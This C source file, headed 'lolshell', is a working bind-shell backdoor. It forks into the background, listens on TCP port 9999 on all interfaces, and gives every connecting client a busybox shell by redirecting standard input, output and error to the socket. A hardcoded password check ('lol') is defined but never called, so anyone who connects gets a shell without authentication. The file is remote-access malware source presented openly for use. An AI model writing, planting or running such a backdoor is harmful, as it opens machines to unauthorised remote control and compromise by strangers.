#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

/*
lolshell by mw \0/

shell won't die if your socket does.
*/

void error(char *err_msg)
{
    perror(err_msg);
    exit(1);
}

//TODO
int checkpass(char* try_pass){
        char *reals = "lol\n";
        return strcmp(try_pass, reals);

}

int main(){
    char hello_buf[] = "henlo!\n";
    int host_sockid, client_sockid;
    int port = 9999;
    struct sockaddr_in host_addr, cli_addr;

    /*

    Here's the struct:

    struct sockaddr_in {
    short int            sin_family;
    unsigned short int   sin_port;
    struct in_addr       sin_addr;
    unsigned char        sin_zero[8];
    };

    */

    socklen_t size_host_addr = sizeof(host_addr);
    socklen_t size_cli_addr = sizeof(cli_addr);

    bzero((char *) &host_addr, size_host_addr);
    bzero((char *) &cli_addr, size_cli_addr);

    if(fork() == 0){
        // create the socket
        host_sockid=socket(PF_INET, SOCK_STREAM, 0); // tcp

        // set up the sockaddr_in struct so we can bind the socket to it
        host_addr.sin_family = AF_INET;
        host_addr.sin_port = htons(port);
        host_addr.sin_addr.s_addr = htonl(INADDR_ANY); // ip

        // bind, listen, accept:

        if(bind(host_sockid, (struct sockaddr*) &host_addr, size_host_addr) < 0){
            error("BIND ERROR");
        }

        if(listen(host_sockid, 5) < 0){ // magic number 5 is just a random choice i made for backlog
            error("LISTEN ERROR");
        }

        while(1){
        client_sockid = accept(host_sockid, (struct sockaddr*) &cli_addr, &size_cli_addr);
        if(client_sockid < 0){
            error("ACCEPT ERROR");
        }

        if(fork() == 0){
            close(host_sockid);
            write(client_sockid, hello_buf, strlen(hello_buf));

            // clone STDIN STDOUT STDERR
            dup2(client_sockid, 0);
            dup2(client_sockid, 1);
            dup2(client_sockid, 2);

            // pick your poison.
            char* arg[] = {"/bin/busybox","sh",NULL};
            execve("/bin/busybox", arg, NULL);
            // execve("/bin/bash", NULL, NULL);

            return 0;
        } else { // not child
            close(client_sockid);
            } // end else
        } // end while
    } // end if child outer
    return 0;
} // end main
